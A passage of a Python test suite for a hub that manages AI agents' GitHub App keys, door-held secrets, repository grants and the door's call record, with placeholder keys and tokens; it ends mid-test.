        self.assertEqual((set(self.origin_team()["logins"]), int(git("rev-list", "--count", "HEAD", cwd=self.kit))),
                         ({old, new}, commits))          # nothing is taken out before the twelfth look in a row
        t2 += hub.DOOR_RENEW_EVERY
        state = hub.door_renew(t2)
        team = self.origin_team()        # the old key is out of the door and of the list, and its successor stays
        self.assertEqual((set(team["logins"]), team["door"]["secrets"]), ({new}, [new]))
        self.assertEqual((int(git("rev-list", "--count", "HEAD", cwd=self.kit)), state["retired"]),
                         (commits + 1, git("rev-parse", "HEAD", cwd=self.kit)))
        text = told("removed its entry, GITHUB_APP_ACME_KEY, from the list")[0]
        self.assertIn("Nothing is needed for it.", text)
        self.assertEqual(hub.door_sealed(DOOR)["keep"], [new])           # the door removes its copy at its next fetch,
        self.assertIsNone(hub.q1("SELECT 1 FROM door_copies WHERE login=?", (old,)))     # and no copy waits for it
        self.assertEqual(dict(hub.q1("SELECT agent, level, by, revision FROM resource_grants WHERE resource=? ORDER BY "
                                     "id DESC", (f"secret:{old}",))), {"agent": "door", "level": None, "by": "hub",
                                                                       "revision": state["retired"]})
        self.assertIs(hub.CENTRAL["due"], True)          # the hub's next pass reads the central vault again
        calls = len(StubDoor.calls)
        self.assertIsNone(hub.door_renew(t2 + hub.DOOR_RENEW_EVERY))
        self.assertEqual(len(StubDoor.calls), calls)     # done, and the old key is out: no more looks
        with self.assertRaisesRegex(hub.ToolError, "github_key is the GitHub account"):
            hub.t_raise_needs_you("manager", {"title": "t", "why": "w", "what_to_do": "d", "github_key": "acme"})

    def test_the_old_app_key_stays_while_something_holds_it_and_the_step_runs_again(self):
        """The hub takes the old App key out of the door and the list only when nothing else holds its entry and the
        entry is a GitHub App key, and only at the twelfth look in a row in which GitHub refuses that key alone. Each
        later look tries again: after an entry that was held, after a commit that failed, and so also in a fleet whose
        renewal was "done" before the hub had this step. The manager reads a reason for which the entry stays when it
        is not the last one said, and then, with no wake-up, that the key went; a look that changes nothing writes
        nothing. A "done" that was not true goes back to the step "delete": GitHub takes the old key."""
        def told(words):
            return [(r["text"], json.loads(r["extra"] or "{}")) for r in hub.q(
                "SELECT text, extra FROM events WHERE agent='manager' AND text LIKE ?", (f"%{words}%",))]

        def look(**answers):
            self.keys(**answers)
            self.at += hub.DOOR_RENEW_EVERY
            return hub.door_renew(self.at)

        def done(**more):
            hub.kv_set("door_github_renew", json.dumps(dict(
                {"owner": "acme", "app_id": "12345", "old": old, "page": self.PAGE, "fingerprint": self.PRINTED,
                 "step": "done", "at": 1, "looks": hub.DOOR_RETIRE_LOOKS - 1}, **more)))
        patcher = patch.dict(hub.DOOR_RENEW, {"at": 0.0, "form": 0.0})
        patcher.start()
        self.addCleanup(patcher.stop)
        (self.root / "door.json").write_text(json.dumps({"token": "token-secret", "record": "record-secret",
                                                         "app_id": "12345"}))
        self.two_keys()
        old, new, rev, self.at = self.OLD, self.NEW, hub.kit_revision(fresh=True), hub.now()
        for change, why in (
                (lambda t: t["logins"][old].update(env="CLOUDFLARE_API_TOKEN"), "not a GitHub App key"),
                (lambda t: t["agents"]["studio"].update(secrets={old: "read"}), "studio still holds it"),
                (lambda t: t.update(resources={f"secret:{old}": {"max": "use", "to": "workers"}}), "grantable pool"),
                (lambda t: t["door"].update(credentials={"cloudflare:acme": {"secret": old}}),
                 "the door's rules use it as cloudflare:acme")):
            team = self.origin_team()
            change(team)
            self.assertIn(why, hub.door_key_kept(team, old, rev)[1])
        with patch.object(hub, "profile_logins",
                          lambda name, rev=None, strict=False: {old} if name == "lead" else set()):
            self.assertIn("lead still holds it", hub.door_key_kept(self.origin_team(), old, rev)[1])
        # a profile that git does not give now may list it: the entry stays until a later round, never as one that no
        # profile lists (a finding of the area "Hub core", 20 November 2026)
        def unread(name, rev=None, strict=False):
            if name == "lead" and strict:
                raise hub.KitUnread("profiles/lead.md")
            return set()
        with patch.object(hub, "profile_logins", unread):
            self.assertEqual(hub.door_key_kept(self.origin_team(), old, rev),
                             ("write", "the hub cannot read the profile of lead now"))
        self.assertIsNone(hub.door_key_kept(self.origin_team(), old, rev))
        team = self.origin_team()                        # an entry that is no GitHub App key stays for good
        team["logins"][old]["env"] = "CLOUDFLARE_API_TOKEN"
        self.write_team(team)
        done()
        self.assertEqual(look(old_signs=False)["retired"], "left")
        self.assertEqual([extra.get("quiet") for _, extra in told("It looks no more")], [True])
        calls = len(StubDoor.calls)
        self.assertIsNone(look(old_signs=False))
        self.assertEqual(len(StubDoor.calls), calls)
        team["logins"][old]["env"] = "GITHUB_APP_ACME_KEY"
        team["agents"]["vps"]["secrets"] = {old: "use"}
        self.write_team(team)
        del hub.TEAM["agents"]["vps"]["secrets"]         # the hub reads team.json again for its write, not its memory
        done()
        self.assertIsNone(look(old_signs=False))
        state = hub.door_renewal()
        self.assertEqual((state["step"], state.get("retired"), state["kept"]), ("done", None, "held vps"))
        self.assertEqual([extra.get("quiet") for _, extra in told("while vps still holds it")], [True])
        kept, changes = hub.kv_get("door_github_renew"), hub.CHANGE["state"]
        self.assertIsNone(look(old_signs=False))         # the same reason again: no second word, and no write
        self.assertEqual((len(told("vps still holds it")), hub.kv_get("door_github_renew"), hub.CHANGE["state"]),
                         (1, kept, changes))
        in_use = {"used": [new], "ref": new, "signs": True, "fingerprint": "SHA256:" + "B" * 43 + "="}
        self.assertTrue(hub.door_key_in_use(state, in_use))
        for other in ({"signs": False}, {"used": [new, old.upper()]}, {"fingerprint": self.PRINTED}, {"used": []},
                      {"ref": old}, {"fingerprint": None}):
            self.assertFalse(hub.door_key_in_use(state, dict(in_use, **other)), other)
        calls = len(StubDoor.calls)                      # the door's App is not the one of this renewal: no look
        self.assertIsNone(hub.door_old_key_look(dict(state, app_id="999"), hub.door_conf(), "12345"))
        self.assertEqual(len(StubDoor.calls), calls)
        team = self.origin_team()
        del team["agents"]["vps"]["secrets"]
        self.write_team(team)
        for answers, words in ((dict(old_signs=False, new_signs=False), "does not show that it makes its tokens"),
                               (dict(old_signs=False, fingerprint="SHA256:" + "C" * 43 + "="),
                                "does not have that fingerprint"),
                               (dict(old_signs=False, skew=-45), "more than 30 seconds off the hub's")):
            hub.kv_set("door_github_renew", json.dumps(dict(hub.door_renewal(), looks=hub.DOOR_RETIRE_LOOKS - 1)))
            self.assertIsNone(look(**answers))           # a 401 for every key, not the old key, a door's clock behind:
            self.assertIsNone(look(old_signs=False))     # each one starts the count again, so this look takes nothing
            self.assertEqual([extra.get("quiet") for _, extra in told(words)], [True])
        for _ in range(6):                               # the count starts again from each of those looks, and from a
            self.assertIsNone(look(old_signs=False))     # look with no answer
        self.assertIsNone(look())
        for _ in range(hub.DOOR_RETIRE_LOOKS - 1):
            self.assertIsNone(look(old_signs=False))
        self.assertEqual(set(self.origin_team()["logins"]), {old, new})
        state = look(old_signs=True, in_use={"fingerprint": self.PRINTED})       # and the door uses that very key:
        self.assertEqual(state["step"], "ask")           # no words to delete it, the renewal asks for a new key again
        text, extra = told("the renewal is back at its first item")[0]
        self.assertEqual(('click "New key"' in text, "Delete" in text, extra.get("quiet")), (True, False, None))
        done()                                           # the same when the door's file still names the old reference
        self.assertEqual(look(old_signs=True, in_use={"used": [old, new]})["step"], "ask")
        done()
        self.assertIsNone(look(old_signs=True, in_use_status=502))       # the door does not say which key it uses:
        self.assertEqual((hub.door_renewal()["step"], hub.door_renewal()["looks"]), ("done", 0))   # no way back, and
        self.assertIsNone(look(old_signs=False))         # the count starts again, so this look takes nothing out
        state = look(old_signs=True, skew=45)            # GitHub takes the old key, also with a door's clock that is
        self.assertEqual(state["step"], "delete")        # off: the "done" was not true
        self.assertEqual((state["looks"], "kept" in state, state["back"]), (0, False, True))
        text, extra = told("Raise the second Needs-you item again")[0]
        self.assertEqual(('github_key "acme"' in text, extra.get("quiet")), (True, None))       # it wakes the manager
        for _ in range(hub.DOOR_RETIRE_LOOKS - 1):       # after a way back, the item closes only at the twelfth look
            self.assertIsNone(look(old_signs=False))     # in a row: a key that GitHub takes now and then does not open
        self.assertEqual(look(old_signs=False)["step"], "done")          # and close it again and again
        self.assertIn("by itself at its next look", told("deleted it, and the hub closed the second item")[0][0])
        held = []

        def fails(*args, **more):
            held.append((hub.KIT._is_owned(), hub.LOCK._is_owned()))
            raise hub.Refusal(409, "the hub checkout has local changes")
        asked, said = len(StubDoor.calls), len(told(""))
        with patch.object(hub, "commit_kit_file", fails):
            self.assertIsNone(look(old_signs=False))     # the next look, and the write fails
        self.assertEqual((hub.door_renewal().get("retired"), hub.door_renewal()["kept"], held),
                         (None, "write", [(True, True)]))
        self.assertEqual((len(StubDoor.calls), len(told(""))), (asked + 2, said + 1))  # one look, one quiet word
        text, extra = told("could not save the change of its files")[0]
        self.assertEqual((extra.get("quiet"), "The hub tries again every 5 minutes." in text), (True, True))
        self.assertTrue(hub.q1("SELECT 1 FROM log WHERE what LIKE ?", ("%did not take the old App key%",)))
        self.assertEqual(set(self.origin_team()["logins"]), {old, new})
        state = look(old_signs=False)                    # the same step again, as for a "done" from before this step
        team = self.origin_team()
        self.assertEqual((set(team["logins"]), team["door"]["secrets"], state["retired"]),
                         ({new}, [new], git("rev-parse", "HEAD", cwd=self.kit)))
        text, extra = told("removed its entry, GITHUB_APP_ACME_KEY, from the list")[0]
        self.assertEqual((extra.get("quiet"), "Nothing is needed for it." in text), (True, True))
        hub.kv_set("door_github_renew", json.dumps({k: v for k, v in state.items() if k != "retired"}))
        calls = len(StubDoor.calls)      # a hub that stopped after the commit and before its mark asks the door nothing
        self.assertEqual((look(old_signs=False)["retired"], len(StubDoor.calls)), ("absent", calls))
        hub.kv_set("door_github_renew", json.dumps({k: v for k, v in state.items() if k != "retired"}))
        hub.TEAM["door"]["secrets"] = [new, old]         # a team in memory from before the hub's own commit
        self.assertEqual(look(old_signs=False)["retired"], "absent")
        self.assertEqual(hub.TEAM["door"]["secrets"], [new])     # the hub runs its own commit now

    def test_the_app_links_the_hub_to_the_door_only_when_the_door_mints_for_every_owner(self):
        """DevOps plan 13, item 4: the app makes the hub's two door secrets on the door and gives them to the hub. The
        hub keeps them only when the door mints a token for one granted repository of each owner, and then it removes
        its own App key, with no rotation. Its records name the two secrets only by their SHA-256."""
        secrets = self.root / "door.json"
        secrets.unlink()
        key = self.root / "github-app.pem"
        key.write_text("app_id=12345\n-----BEGIN RSA PRIVATE KEY-----\nx\n-----END RSA PRIVATE KEY-----\n")
        key.chmod(0o600)
        hub.CFG["github_app"] = str(key)
        self.addCleanup(hub.CFG.pop, "github_app", None)
        team = self.origin_team()
        team["agents"]["vps"]["repos"] = {"acme/web": "write", "founderizer/founderizer-apps": "read",
                                          "acme/x-Given": "read", "acme/x-pressed": "read", "acme/zz-Back": "read",
                                          "acme/x-other": "read"}
        team["agents"]["studio"]["repos"] = {"other/site": "read"}
        self.write_team(team)
        # a read that the manager gave and a read of the owner's Give have records; the others are the owner's own
        # a read that the manager gave, a read of the owner's Give (need_give_press writes it), a hold that the owner
        # took back and then gave again from the agent's page (no row: the newest row is the take-back), and another
        # agent's row for a repository that vps holds with none of its own
        for ts, rid, agent, level, by in ((1, "repo:acme/x-given", "vps", "read", "manager"),
                                          (2, "repo:acme/x-pressed", "vps", "read", "owner"),
                                          (3, "repo:acme/zz-back", "vps", "read", "manager"),
                                          (4, "repo:acme/zz-back", "vps", None, "owner"),
                                          (5, "repo:acme/x-other", "studio", "read", "manager")):
            hub.q("INSERT INTO resource_grants(ts,resource,agent,level,by) VALUES(?,?,?,?,?)",
                  (ts, rid, agent, level, by))
        view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertEqual((view["github_app"]["app_id"], view["linked"], view["door_secrets"]), ("12345", False, False))
        self.assertEqual(view["agents"]["vps"]["repos"], {"acme/web": "write", "acme/zz-Back": "read",
                                                          "acme/x-Given": "read", "acme/x-other": "read",
                                                          "acme/x-pressed": "read",
                                                          "founderizer/founderizer-apps": "read"})
        # The holds that the door may make commit targets of, for an Operator (the Door area's read of 26 November
        # 2026): a write, and a hold that no record names. Bug: a read that the manager gave becomes the door's commits,
        # whose push the repository's jobs run beside their secrets, once the agent gets a server.
        self.assertEqual(view["agents"]["vps"]["targets"], ["acme/web", "acme/x-other", "acme/zz-Back",
                                                             "founderizer/founderizer-apps"])
        self.assertEqual(view["agents"]["studio"]["targets"], ["other/site"])
        token, record = "t" * 43, "r" * 43
        StubDoor.answers["/github/token"] = (200, {"tokens": [], "errors": [{"repos": ["other/site"], "error": "no App"}]})
        status, answer = self.owner("/ui/door/secrets", token=token, record=record)
        self.assertEqual(status, 409, answer)
        self.assertIn("does not mint for every owner", answer["error"])
        self.assertFalse(secrets.exists())
        self.assertTrue(key.exists())
        StubDoor.calls = []
        StubDoor.answers["/github/token"] = (200, {"tokens": [{"token": "ghs_" + "b" * 36, "access": "read",
                                                               "repos": ["x/y"]}], "errors": []})
        status, answer = self.owner("/ui/door/secrets", token=token, record=record)
        self.assertEqual(status, 200, answer)
        self.assertEqual((answer["owners"], answer["app_removed"]), (["acme", "other"], True))
        self.assertEqual(sorted((b["agent"], sorted(b["repos"])) for _, _, _, b in StubDoor.calls),
                         [("studio", ["other/site"]), ("vps", ["acme/web"])])
        self.assertEqual(json.loads(secrets.read_text()), {"token": token, "record": record, "app_id": "12345"})
        self.assertEqual(oct(secrets.stat().st_mode & 0o777), "0o600")
        self.assertFalse(key.exists())
        stored = [r["body"] for r in hub.q("SELECT body FROM ui_controls WHERE route='door/secrets'")]
        self.assertTrue(stored and all(token not in b and record not in b for b in stored))
        github = self.request("/ui/team?db=test-generation", source=OWNER)[1]["github"]
        self.assertEqual((github["app"], github["door"], github["app_id"]), (True, True, "12345"))
        view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertEqual((view["github_app"], view["linked"], view["door_secrets"]), (None, True, True))
        # a file of the two secrets that the hub cannot read is there all the same: the app does not link that hub
        # again, which would stop the secrets that it has (the review of 22 November 2026)
        secrets.write_text("not json")
        view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertEqual((view["linked"], view["door_secrets"]), (False, True))
        # nor one whose stat fails for a moment (a folder that the service cannot read): os.path.exists said False for
        # each error, and the app would link that hub again (a Fable read of 22 November 2026)
        real = {"stat": os.stat, "lstat": os.lstat}

        def denied(name):
            def call(path, *args, **kwargs):
                if os.fspath(path) == str(secrets):
                    raise PermissionError(13, "Permission denied", str(secrets))
                return real[name](path, *args, **kwargs)
            return call
        with patch("os.lstat", denied("lstat")), patch("os.stat", denied("stat")):
            view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertEqual(view["door_secrets"], True)
        secrets.unlink()
        self.assertFalse(hub.door_secrets_there())
        secrets.write_text("not json")

    def test_a_hub_put_back_with_no_key_of_its_own_is_linked_and_keeps_a_key_file_that_it_cannot_read(self):
        """A hub put back from a backup holds no App key (it gave it to the door) and no file of the door's secrets:
        the app links it again (DoorAccess.gitHubStep). Its check asks the door what its App reaches with the secrets
        of this link, so an account that no App reaches holds no link (a bug that asked every owner to mint refused
        the link at each round), and the hub keeps an App's ID only where the renewal of its old key names it, the one
        record that the hub held that key (a bug that kept another App's ID asked the owner to renew a key that the hub
        never held). A key file that the hub cannot read, as a restore can leave it with another mode, is no key of the
        door's: the link puts it aside whole (a bug that removed every file at the path took a key that the door may not
        hold, and one that left it made the readings of a linked hub fail)."""
        secrets = self.root / "door.json"
        secrets.unlink()
        key = self.root / "github-app.pem"
        key.write_text("app_id=12345\n-----BEGIN RSA PRIVATE KEY-----\nx\n-----END RSA PRIVATE KEY-----\n")
        key.chmod(0o644)
        hub.CFG["github_app"] = str(key)
        self.addCleanup(hub.CFG.pop, "github_app", None)
        team = self.origin_team()
        team["agents"]["vps"]["repos"] = {"acme/web": "write", "other/site": "read"}
        self.write_team(team)
        view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertEqual((view["github_app"], view["linked"], view["door_secrets"]), (None, False, False))
        StubDoor.calls = []
        StubDoor.answers["/github/reach"] = (200, {"pages": {"acme": "https://github.com/settings/installations/5"},
                                                   "all": [], "repos": ["acme/web"], "install": None})
        StubDoor.answers["/github/token"] = (200, {"tokens": [{"token": "ghs_" + "b" * 36, "access": "read",
                                                               "repos": ["acme/web"]}], "errors": []})
        status, answer = self.owner("/ui/door/secrets", token="t" * 43, record="r" * 43)
        self.assertEqual((status, answer.get("owners"), answer.get("app_removed")), (200, ["acme"], False), answer)
        self.assertEqual(StubDoor.calls[0][:3], ("GET", "/github/reach", "Bearer " + "t" * 43))
        self.assertEqual(json.loads(secrets.read_text()), {"token": "t" * 43, "record": "r" * 43})
        self.assertFalse(key.exists())          # aside, whole, so that the readings ask the door and not that file
        self.assertTrue(key.with_name(key.name + ".unread").exists())
        # a renewal of the hub's old key that the backup kept names its App: that one stays
        hub.kv_set("door_github_renew", json.dumps({"owner": "acme", "app_id": "555", "step": "ask"}))
        status, answer = self.owner("/ui/door/secrets", token="t" * 43, record="r" * 43)
        self.assertEqual((status, json.loads(secrets.read_text()).get("app_id")), (200, "555"), answer)
        hub.kv_set("door_github_renew", "null")

    def test_once_linked_the_marks_of_what_the_app_reaches_come_from_the_door(self):
        """The coordinator, 6 November 2026: the marks of "What the App reaches" must not go blank with the move. The
        door holds the App key, so it reads the installations, and the hub keeps a page only in GitHub's own forms."""
        self.addCleanup(hub.GITHUB_REACH.update, at=None, reach=None, reading=False)
        org = "https://github.com/organizations/Acme/settings/installations/5"
        StubDoor.answers["/github/reach"] = (200, {
            "pages": {"acme": org, "evil": "https://evil.example/settings", "bob": org.replace("Acme", "other"),
                      "solo": "https://github.com/settings/installations/6"},
            "all": ["Solo", "not a login!"], "repos": ["acme/web", "ACME/Ops", "acme/x y"], "many": ["Solo", 7],
            "install": "https://github.com/apps/fleet-app/installations/new"})
        with patch.object(hub, "github_app", lambda: None):
            reach = hub.github_reach_read()
            self.assertEqual(reach, {"pages": {"acme": org, "solo": "https://github.com/settings/installations/6"},
                                     "all": {"solo"}, "repos": {"acme/web", "acme/ops"},
                                     "install": "https://github.com/apps/fleet-app/installations/new",
                                     "owners": set(), "many": {"solo"}})
            self.assertEqual(StubDoor.calls[-1][:3], ("GET", "/github/reach", "Bearer token-secret"))
            hub.github_reach_refresh()
            self.assertEqual(hub.github_unreached(["acme/web", "acme/site", "solo/any", "new/y"]),
                             {"acme/site": org, "new/y": "https://github.com/apps/fleet-app/installations/new"})
            StubDoor.answers["/github/reach"] = (502, {"error": "GitHub gave no list"})
            with self.assertRaisesRegex(hub.GitHubError, "no reading of what its App reaches"):
                hub.github_reach_read()

    def test_an_account_that_no_app_reaches_is_told_to_the_manager_once(self):
        """Plan 2.20: a private App reaches only the account that made it, so an account where agents hold
        repositories and that no App of the door reaches needs its own. The hub tells the manager once, and again only
        after that account was reached in between."""
        team = self.origin_team()
        team["agents"]["vps"]["repos"] = {"acme/web": "write", "other/site": "read", "own/tool": "read"}
        self.write_team(team)
        reach = {"pages": {"acme": "https://github.com/settings/installations/5"}, "all": set(), "repos": {"acme/web"},
                 "install": None, "owners": {"own"}}

        def told():
            return [r["text"] for r in hub.q("SELECT text FROM events WHERE agent='manager' AND text LIKE "
                                             "'%No GitHub App of the door reaches%'")]
        self.assertEqual(hub.github_app_asks(reach), ["other"])
        self.assertIn('github_app "other"', told()[-1])
        self.assertEqual(hub.github_app_asks(reach), [])
        self.assertEqual(len(told()), 1)
        hub.github_app_asks(dict(reach, all={"other"}))           # reached in between
        self.assertEqual(hub.github_app_asks(reach), ["other"])
        secrets = self.root / "door.json"
        secrets.unlink()                                          # not linked: the hub's own App decides
        self.assertEqual(hub.github_app_asks(dict(reach, all=set())), [])

    def test_a_github_app_item_and_the_id_of_the_app_that_the_app_made(self):
        options = ["Make the App on GitHub", "Not now"]
        with self.assertRaisesRegex(hub.ToolError, "needs options"):
            hub.t_raise_needs_you("manager", {"title": "A GitHub App for Acme", "why": "Agents get no token there.",
                                              "what_to_do": "Make it on GitHub.", "github_app": "Acme"})
        with self.assertRaisesRegex(hub.ToolError, "its login"):
            hub.t_raise_needs_you("manager", {"title": "A GitHub App for Acme", "why": "Agents get no token there.",
                                              "what_to_do": "Make it on GitHub.", "github_app": "a b",
                                              "options": options})
        said = hub.t_raise_needs_you("manager", {"title": "A GitHub App for Acme", "why": "Agents get no token there.",
                                                 "what_to_do": "Make it on GitHub.", "github_app": "Acme",
                                                 "options": options})
        self.assertIn("GitHub's own page that makes a private App in Acme", said.replace("\n", " "))
        need = hub.q1("SELECT * FROM needs ORDER BY id DESC LIMIT 1")
        self.assertEqual(hub.need_view(need)["github_app"], "Acme")
        status, answer = self.owner("/ui/door/github-app", owner="Acme", app_id="777")
        self.assertEqual(status, 200, answer)
        self.assertEqual(self.origin_team()["door"]["github_apps"], {"acme": "777"})
        view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertEqual(view["github_apps"], {"acme": "777"})
        with patch.object(hub, "github_app", lambda: None):
            github = self.request("/ui/team?db=test-generation", source=OWNER)[1]["github"]
        self.assertEqual((github["app"], github["app_id"]), (True, "777"))
        self.assertEqual(self.owner("/ui/door/github-app", owner="Acme", app_id="x")[0], 400)
        # H2 (windows-app-plan-v2.md 5.3): an owner whose PC cannot keep the door gets no card of it, door or not
        with patch.object(hub, "owner_computer", lambda: {"kind": "windows", "label": "PC", "can": ["agents"]}), \
                self.assertRaisesRegex(hub.ToolError, "The owner's computer is a PC, and its app cannot set up the "
                                                      "door to the servers and approve its calls yet, so the hub "
                                                      "offers no door"):
            hub.t_raise_needs_you("manager", {"title": "A GitHub App for Acme", "why": "Agents get no token there.",
                                              "what_to_do": "Make it on GitHub.", "github_app": "Acme",
                                              "options": options})
        team = self.origin_team()
        del team["door"]
        self.write_team(team)
        with self.assertRaisesRegex(hub.ToolError, "no door"):
            hub.t_raise_needs_you("manager", {"title": "A GitHub App for Acme", "why": "Agents get no token there.",
                                              "what_to_do": "Make it on GitHub.", "github_app": "Acme",
                                              "options": options})

    def test_a_door_that_refuses_gives_no_token_and_the_hub_uses_no_key_of_its_own(self):
        StubDoor.answers["/github/token"] = (403, {"error": "vps is not in the door's access file"})
        with patch.object(hub, "github_app", lambda: self.fail("a hub with a door reads no App key")):
            with self.assertRaisesRegex(hub.GitHubError, "not in the door's access file"):
                hub.github_tokens({"acme/web": "read"}, "vps")

    def test_a_hub_with_no_door_keeps_its_own_key(self):
        team = self.origin_team()
        del team["door"]
        self.write_team(team)
        with patch.object(hub, "github_app", lambda: None):
            with self.assertRaisesRegex(hub.GitHubError, "the hub has no GitHub App yet"):
                hub.github_tokens({"acme/web": "read"}, "vps")
        self.assertEqual(StubDoor.calls, [])

    def test_the_record_each_minute_and_one_word_when_the_door_stops_and_comes_back(self):
        StubDoor.answers["/record"] = (200, {"entries": [
            {"n": 1, "ts": 1.0, "caller": "vps", "target": "web-1", "action": "restart", "kind": "rule",
             "outcome": "done", "why": "a rule call", "task": "T-41"},
            {"n": 2, "ts": 2.0, "caller": "vps", "target": "web-1", "action": "install", "kind": "own",
             "outcome": "done", "why": "vps's own call, which it answers for: the host form install",
             "task": "T-41; and words that are no task's code"}], "last": 2})
        hub.DOOR.update(read_at=0.0, error=None)
        self.assertEqual(hub.door_sweep(t0=100.0), 2)
        self.assertEqual(StubDoor.calls[-1][1:3], ("/record?after=0", "Bearer record-secret"))
        self.assertEqual(hub.q1("SELECT COUNT(*) n FROM door_record")["n"], 2)
        # the task that the caller named with its call, as the door wrote it: only a task's code is kept
        self.assertEqual([r["task"] for r in hub.q("SELECT task FROM door_record ORDER BY n")], ["T-41", None])
        self.assertIsNone(hub.door_sweep(t0=120.0))         # once a minute
        StubDoor.answers["/record"] = (503, {})
        hub.door_sweep(t0=200.0)
        hub.door_sweep(t0=300.0)
        said = [r["text"] for r in hub.q("SELECT text FROM events WHERE agent='manager' AND text LIKE '%door%'")]
        self.assertEqual(len([t for t in said if "does not answer" in t]), 1)
        StubDoor.answers["/record"] = (200, {"entries": [], "last": 2})
        hub.door_sweep(t0=400.0)
        self.assertEqual(StubDoor.calls[-1][1], "/record?after=1")      # its own last line again: the same record
        said = [r["text"] for r in hub.q("SELECT text FROM events WHERE agent='manager' AND text LIKE '%door%'")]
        self.assertEqual(said[-1], "[hub] The door answers again.")

    def test_the_record_of_a_door_that_was_built_again_is_read_from_its_first_line(self):
        """A door built again (a new server, or its state folder lost) numbers its record from 1. Asked after the
        hub's own newest line, it gave nothing until it passed that number, and then its first lines were never read:
        a repository that it made was not the door's for grant_check. The hub asks again for its own last line: a
        door whose newest line is below it, or whose line of that number is another call, has a new record, whose
        lines come after the hub's own (the kv key door_record_base, so a restart of the hub keeps it)."""
        def line(n, ts, **more):
            return dict({"n": n, "ts": ts, "caller": "vps", "target": "web-1", "action": "restart", "kind": "rule",
                         "outcome": "done", "why": "a rule call"}, **more)
        made = {"target": "github:acme", "action": "repo-new", "why": "a new private repository"}
        StubDoor.answers["/record"] = (200, {"entries": [line(1, 1.0), line(2, 2.0)], "last": 2})
        hub.DOOR.update(read_at=0.0, error=None)
        self.assertEqual(hub.door_sweep(t0=100.0), 2)
        StubDoor.answers["/record"] = (200, {"entries": [], "last": 1})        # built again, after its first call
        self.assertEqual(hub.door_sweep(t0=200.0), 0)
        self.assertEqual((StubDoor.calls[-1][1], hub.kv_get("door_record_base")), ("/record?after=1", "2"))
        StubDoor.answers["/record"] = (200, {"entries": [line(1, 300.0, made="acme/newapp", **made)], "last": 1})
        self.assertEqual(hub.door_sweep(t0=300.0), 1)
        self.assertEqual(StubDoor.calls[-1][1], "/record?after=0")
        self.assertTrue(hub.door_made("acme/newapp"))
        # Built again once more, and its count passed the hub's before the hub could read it: its line 1 is another.
        StubDoor.answers["/record"] = (200, {"entries": [line(1, 350.0), line(2, 351.0)], "last": 3})
        self.assertEqual(hub.door_sweep(t0=400.0), 0)
        self.assertEqual((StubDoor.calls[-1][1], hub.kv_get("door_record_base")), ("/record?after=0", "3"))
        StubDoor.answers["/record"] = (200, {"entries": [line(1, 350.0), line(2, 351.0),
                                                         line(3, 352.0, made="acme/second", **made)], "last": 3})
        self.assertEqual(hub.door_sweep(t0=500.0), 3)
        self.assertEqual([(r["n"], r["made"]) for r in hub.q("SELECT n, made FROM door_record ORDER BY n")],
                         [(1, None), (2, None), (3, "acme/newapp"), (4, None), (5, None), (6, "acme/second")])
        self.assertTrue(hub.door_made("acme/second"))
        StubDoor.answers["/record"] = (200, {"entries": [line(3, 352.0, made="acme/second", **made)], "last": 3})
        self.assertEqual(hub.door_sweep(t0=600.0), 1)                       # the same record: nothing new
        self.assertEqual((StubDoor.calls[-1][1], hub.kv_get("door_record_base")), ("/record?after=2", "3"))
        self.assertEqual(hub.q1("SELECT COUNT(*) n FROM door_record")["n"], 6)

    def test_a_refusal_in_the_read_that_brings_full_access_is_told(self):
        """The door's record and its word of the modes come in one read. The hub keeps the read's lines before it takes
        the word, so a root script that the door refused just before it took the owner's Full access is in the record
        that the news reads (door_full_waiting; a review of 20 November 2026: on 13 November the door refused three
        times in the minute before it took his Full access)."""
        self.grant(agent="vps", server="web-1", level="fix")
        mine = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Read the checkout logs','vps','working')")
        waits = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Ship the waiting fixes','vps','working')")
        t = time.time()
        card = run_card(script="journalctl -u app\n")
        hub.q("UPDATE door_record SET task=? WHERE call=?", (f"T-{mine}", card["door_call"]))
        nid = int(hub.t_raise_needs_you("manager", card).split("N-")[1].split(".")[0])
        full = {"v": 1, "kind": "door-mode", "fleet": hub.fleet_id(), "host": "web-1", "mode": "full",
                "at": int(t) - 100}
        hub.q("UPDATE needs SET approval=?, answer='answered', chosen=1, answered=? WHERE id=?",
              (json.dumps({"statement": json.dumps(full, sort_keys=True, separators=(",", ":")), "signature": "c2ln"}),
               t - 90, nid))
        top = hub.q1("SELECT MAX(n) n FROM door_record")["n"]
        hub.DOOR.update(read_at=0.0, error=None)
        StubDoor.answers["/record"] = (200, {"entries": [], "last": top, "modes": {"web-1": {"mode": "auto"}}})
        self.assertEqual(hub.door_sweep(t0=t + 10), 0)

        def told():
            return [r["task"] for r in hub.q("SELECT task FROM events WHERE agent='vps' AND kind='say' AND "
                                             "text LIKE '%Full access on web-1 now%' ORDER BY id")]
        # a full page: the door has more lines after it, so its word waits for the read that brings them
        page = [{"n": top + i, "ts": t + 20, "caller": "lead", "target": "db-1", "action": "uptime", "kind": "rule",
                 "outcome": "done", "why": "a rule call"} for i in range(1, hub.DOOR_PAGE + 1)]
        full_word = {"web-1": {"mode": "full", "at": full["at"]}}
        StubDoor.answers["/record"] = (200, {"entries": page, "last": top + hub.DOOR_PAGE + 1, "modes": full_word})
        self.assertEqual(hub.door_sweep(t0=t + 80), hub.DOOR_PAGE)
        self.assertEqual(told(), [])
        script = b"apt-get install --only-upgrade openssl\n"
        StubDoor.answers["/record"] = (200, {"entries": [page[-1], {
            "n": top + hub.DOOR_PAGE + 1, "ts": t + 50, "caller": "vps", "target": "web-1", "action": "run",
            "kind": "refused", "outcome": "refused",
            "why": f"run {door_targets.NO_BOX}, which no grant on web-1 covers.",
            "sha256": hub.door_call_hash("web-1", "run", [], script), "task": f"T-{waits}"}],
            "last": top + hub.DOOR_PAGE + 1, "modes": full_word})
        self.assertEqual(hub.door_sweep(t0=t + 140), 2)
        self.assertEqual(told(), [mine, waits])

    def test_a_repository_that_the_door_made_reaches_the_hub_and_the_manager_gives_it_up_to_write(self):
        """New-projects plan N3: the door's record line names what a repo-new made, the hub keeps it in its copy, and
        grant_check lets the manager give that repository, at write at most, to an agent that holds no server through
        the door."""
        StubDoor.answers["/record"] = (200, {"entries": [
